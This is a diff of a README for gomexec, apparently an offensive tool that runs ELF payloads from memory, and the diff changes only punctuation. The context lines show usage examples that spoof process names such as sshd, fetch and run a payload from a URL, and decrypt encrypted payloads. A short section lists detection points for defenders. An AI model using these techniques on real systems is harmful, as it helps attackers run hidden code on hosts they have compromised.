@@ -2,7 +2,7 @@
 
 Execute ELF binaries straight from memory, no files dropped on disk.
 
-Uses `memfd_create` + `execveat(AT_EMPTY_PATH)` — the ELF runs entirely in RAM with no path string, no tmpfs, and an empty memfd name. Designed as a standalone CLI that composes naturally with stdin pipes.
+Uses `memfd_create` + `execveat(AT_EMPTY_PATH)`. The ELF runs entirely in RAM with no path string, no tmpfs, and an empty memfd name. Designed as a standalone CLI that composes naturally with stdin pipes.
 
 ## Install
 
@@ -36,7 +36,7 @@ cat payload.elf | NAME=sshd gomexec -- -D -p 443
 # fetch from URL directly, no curl on target needed
 URL=https://example.com/payload NAME=/usr/bin/python3 gomexec
 
-# encrypted payload — 32-byte key = AES-256-GCM, anything else = XOR
+# encrypted payload (32-byte key = AES-256-GCM, anything else = XOR)
 cat payload.enc | KEY=<64-hex-chars> gomexec
 
 # chain with nightcloak
@@ -61,14 +61,14 @@ cat payload.elf | NAME=sshd gomexec -s gs_secret
 
 1. Read payload from stdin (or fetch via `URL`)
 2. Decrypt if `KEY` is set
-3. `memfd_create("", 0)` — anonymous in-memory fd, empty name
+3. `memfd_create("", 0)`, anonymous in-memory fd, empty name
 4. Write payload into the fd
-5. `execveat(fd, "", argv, envp, AT_EMPTY_PATH)` — no path string used
+5. `execveat(fd, "", argv, envp, AT_EMPTY_PATH)`, no path string used
 6. Falls back to `/proc/self/fd/[fd]` exec if `execveat` fails
 
 ## What defenders see
 
-- `/proc/[pid]/exe` points to `memfd: (deleted)` — unavoidable
+- `/proc/[pid]/exe` points to `memfd: (deleted)` (unavoidable)
 - `execveat` and `memfd_create` are auditable via auditd (`-S execveat -S memfd_create`)
 - Falco rules exist for memfd-based execution patterns
 - `ps aux` shows the spoofed `NAME`, not the real binary
